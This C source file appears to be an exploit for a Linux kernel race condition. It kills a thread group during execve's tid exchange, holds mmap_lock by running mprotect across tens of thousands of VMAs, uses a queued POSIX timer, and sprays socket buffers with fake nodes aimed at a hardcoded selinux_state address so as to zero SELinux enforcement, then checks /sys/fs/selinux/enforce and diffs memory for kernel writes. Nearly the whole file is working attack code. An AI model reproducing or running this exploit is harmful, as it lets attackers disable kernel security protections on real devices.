/*
 * race - reproduce the published trigger's timing mechanism:
 * a killer helper polls tgkill(tgid, old_exec_tid, 0) and fires SIGKILL the
 * instant de_thread()'s exchange_tids() makes that tid vanish (ESRCH).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <stdint.h>
#include <stdatomic.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sched.h>

#define NVMA 50000
#define N_TIMERS 2048
#define ARMED_INDEX 1024
#define KVA 0xffff000000000000ULL
#define N_STREAMS 256
static unsigned char g_payload[8192];
static unsigned char g_base[N_STREAMS][8192];
static unsigned char g_now[8192];
static int g_sv[N_STREAMS][2];

static int wait_zombie_nowait(pid_t pid, int ms, int *status)
{
    int waited = 0;
    for (;;) {
        siginfo_t info;
        memset(&info, 0, sizeof(info));
        if (waitid(P_PID, (id_t)pid, &info, WEXITED | WNOHANG | WNOWAIT) == 0 &&
            info.si_pid == pid) {
            *status = info.si_status;
            return 0;
        }
        if (waited >= ms) return 1;
        usleep(500);
        waited++;
    }
}

/* selinux_state - 7 for the current boot (static 0xffffffc082959630 + slide) */
#define SELINUX_MINUS7 0xffffffe4dc559629ULL

static int build_tiled(unsigned char *p, size_t len, uint64_t target)
{
    size_t off;
    int n = 0;
    memset(p, 0, len);
    for (off = 0; off + 24 <= len; off += 24) {
        uint64_t *node = (uint64_t *)(p + off);
        node[0] = 0;
        node[1] = 0;
        node[2] = target;
        n++;
    }
    return n;
}

static int spray_and_diff(pid_t child, int *diffs_out)
{
    int i, made = 0, diffs = 0;
    *diffs_out = 0;
    for (i = 0; i < N_STREAMS; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_sv[i]) != 0) break;
        if (send(g_sv[i][0], g_payload, sizeof(g_payload), MSG_DONTWAIT) != (ssize_t)sizeof(g_payload)) {
            close(g_sv[i][0]); close(g_sv[i][1]); break;
        }
        made++;
    }
    for (i = 0; i < made; i++) {
        ssize_t n = recv(g_sv[i][1], g_base[i], sizeof(g_base[i]), MSG_PEEK | MSG_DONTWAIT);
        if (n != (ssize_t)sizeof(g_base[i])) memset(g_base[i], 0, sizeof(g_base[i]));
    }
    { int st = 0; waitpid(child, &st, 0); }      /* the reap */
    {   /* did the zero-write land on selinux_state-7? */
        char b[8] = {0};
        int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
        if (fd >= 0) {
            if (read(fd, b, 1) > 0) printf("    enforce=%s", b[0] ? b : "?\n");
            close(fd);
        }
    }
    usleep(15000);
    for (i = 0; i < made; i++) {
        ssize_t n = recv(g_sv[i][1], g_now, sizeof(g_now), MSG_PEEK | MSG_DONTWAIT);
        int j;
        if (n != (ssize_t)sizeof(g_now)) continue;
        if (memcmp(g_now, g_base[i], sizeof(g_now)) == 0) continue;
        for (j = 0; j + 8 <= (int)sizeof(g_now); j += 8) {
            uint64_t a, b;
            memcpy(&a, g_base[i] + j, 8);
            memcpy(&b, g_now + j, 8);
            if (a != b && b >= KVA) {
                printf("    HIT stream[%d] +0x%03x : 0x%016llx -> 0x%016llx\n",
                       i, j, (unsigned long long)a, (unsigned long long)b);
                diffs++;
            }
        }
        if (diffs >= 8) break;
    }
    for (i = 0; i < made; i++) { close(g_sv[i][0]); close(g_sv[i][1]); }
    printf("    streams=%d diffs=%d\n", made, diffs);
    *diffs_out = diffs;
    return 0;
}

struct shared { _Atomic int helpers[8]; _Atomic int nhelpers; };
static struct shared *g_sh;
static _Atomic int g_exec_tid;
static _Atomic int g_stop;
static _Atomic int g_go;
static _Atomic int g_in_mprotect;
static void *g_vmas;
static size_t g_vmalen;
static int g_vmafd;

static void noop(int s) { (void)s; }
static int pin_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    return sched_setaffinity(0, sizeof(set), &set);
}

static int prepare_vmas(void)
{
    long page = sysconf(_SC_PAGESIZE);
    int i;
    g_vmafd = (int)syscall(SYS_memfd_create, "v", 1);
    if (g_vmafd < 0 || ftruncate(g_vmafd, page)) return -1;
    g_vmalen = (size_t)NVMA * (size_t)page;
    g_vmas = mmap(NULL, g_vmalen, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_vmas == MAP_FAILED) return -1;
    for (i = 0; i < NVMA; i++) {
        void *at = (char *)g_vmas + (size_t)i * (size_t)page;
        if (mmap(at, (size_t)page, PROT_READ, MAP_SHARED | MAP_FIXED, g_vmafd, 0) != at)
            return -1;
    }
    return 0;
}

static int locker_fn(void *arg)
{
    int prot = PROT_NONE;
    (void)arg;
    while (!atomic_load(&g_go)) { if (atomic_load(&g_stop)) return 0; sched_yield(); }
    while (!atomic_load(&g_stop)) {
        atomic_store(&g_in_mprotect, 1);
        mprotect(g_vmas, g_vmalen, prot);
        atomic_store(&g_in_mprotect, 0);
        prot = (prot == PROT_NONE) ? PROT_READ : PROT_NONE;
    }
    return 0;
}

static int killer_fn(void *arg)
{
    int tgid = (int)(intptr_t)arg;
    int old;
    pin_cpu(2);
    while (!(old = atomic_load(&g_exec_tid))) {
        if (atomic_load(&g_stop)) return 0;
        sched_yield();
    }
    for (;;) {
        if (syscall(SYS_tgkill, tgid, old, 0) < 0 && errno == ESRCH) break;
        if (atomic_load(&g_stop)) return 0;
    }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    return 0;
}

#define HELPER_STACK (1 << 20)
static int spawn_helper(int (*fn)(void *), void *arg)
{
    void *stack = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
    int pid, idx;
    if (stack == MAP_FAILED) return -1;
    pid = (int)clone(fn, (char *)stack + HELPER_STACK, CLONE_VM | SIGCHLD, arg);
    if (pid > 0 && g_sh) {
        idx = atomic_fetch_add(&g_sh->nhelpers, 1);
        if (idx >= 0 && idx < 8) atomic_store(&g_sh->helpers[idx], pid);
    }
    return pid;
}

static void *exec_fn(void *arg)
{
    static timer_t many[N_TIMERS];
    struct sigevent plain, armed_ev;
    struct itimerspec spec;
    char *argv[] = { (char *)"race", (char *)"--exec-ok", NULL };
    int i;
    (void)arg;

    memset(&plain, 0, sizeof(plain));
    plain.sigev_notify = SIGEV_NONE;              /* slab filler */
    memset(&armed_ev, 0, sizeof(armed_ev));
    armed_ev.sigev_notify = SIGEV_SIGNAL;         /* the one that queues */
    armed_ev.sigev_signo = SIGRTMIN;
    memset(&spec, 0, sizeof(spec));
    spec.it_value.tv_sec = 3600;

    if (pin_cpu(0)) _exit(116);
    for (i = 0; i < N_TIMERS; i++) {
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, i == ARMED_INDEX ? &armed_ev : &plain, &many[i]))
            _exit(120);
        if (i == ARMED_INDEX && timer_settime(many[i], 0, &spec, NULL)) _exit(120);
    }
    atomic_store(&g_exec_tid, (int)syscall(SYS_gettid));
    atomic_store(&g_go, 1);
    while (!atomic_load(&g_in_mprotect)) { if (atomic_load(&g_stop)) _exit(123); sched_yield(); }
    dprintf(2, "[exec] execve tid=%ld\n", (long)syscall(SYS_gettid));
    execve("/proc/self/exe", argv, NULL);
    _exit(122);
}

static int child_race(void)
{
    pthread_t th;
    sigset_t block;
    int tgid = (int)getpid();
    int i;

    sigemptyset(&block); sigaddset(&block, SIGRTMIN);
    sigprocmask(SIG_BLOCK, &block, NULL);
    if (prepare_vmas()) _exit(110);
    if (pin_cpu(1)) _exit(115);
    if (spawn_helper(locker_fn, NULL) < 0) _exit(111);
    if (spawn_helper(killer_fn, (void *)(intptr_t)tgid) < 0) _exit(112);
    if (pthread_create(&th, NULL, exec_fn, NULL)) _exit(114);
    for (;;) pause();
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 10;
    int i, killed = 0, hits = 0;

    if (argc > 1 && !strcmp(argv[1], "--exec-ok")) return 0;
    printf("tiled nodes: %d (target=%#llx)\n",
           build_tiled(g_payload, sizeof(g_payload), SELINUX_MINUS7),
           (unsigned long long)SELINUX_MINUS7);
    printf("=== race + spray + diff (tid-swap kill, %d VMAs), %d rounds ===\n", NVMA, rounds);
    g_sh = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (g_sh == MAP_FAILED) return 1;

    for (i = 0; i < rounds; i++) {
        pid_t child;
        int st = 0, waited = 0;
        atomic_store(&g_stop, 0);
        atomic_store(&g_go, 0);
        atomic_store(&g_in_mprotect, 0);
        atomic_store(&g_exec_tid, 0);
        if (g_sh) { int z; atomic_store(&g_sh->nhelpers, 0); for (z = 0; z < 8; z++) atomic_store(&g_sh->helpers[z], 0); }

        child = fork();
        if (child == 0) child_race();
        if (child < 0) break;

        if (wait_zombie_nowait(child, 3000, &st) != 0) {
            kill(child, SIGKILL);
            waitpid(child, &st, 0);
            printf("  round %d: timeout, child force-killed\n", i);
        } else {
            int diffs = 0;
            spray_and_diff(child, &diffs);      /* spray, peek, reap, diff */
            if (diffs) hits++;
            printf("  round %d: zombie detected (si_status=%d) diffs=%d\n", i, st, diffs);
        }
        /* always reap the CLONE_VM helpers: they are separate tasks and would
         * otherwise keep spinning mprotect after the main child is gone */
        if (g_sh) {
            int h, n = atomic_load(&g_sh->nhelpers);
            for (h = 0; h < n && h < 8; h++) {
                int hp = atomic_load(&g_sh->helpers[h]);
                if (hp > 0) kill(hp, SIGKILL);
            }
        }
        if (WIFSIGNALED(st)) {
            killed++;
            printf("  round %d: child killed by signal %d after ~%dms\n", i, WTERMSIG(st), waited);
        } else {
            printf("  round %d: child not signalled (status=0x%x, %dms)\n", i, st, waited);
        }
    }
    printf("race done: signalled=%d/%d  kernel-write hits=%d\n", killed, rounds, hits);
    return 0;
}
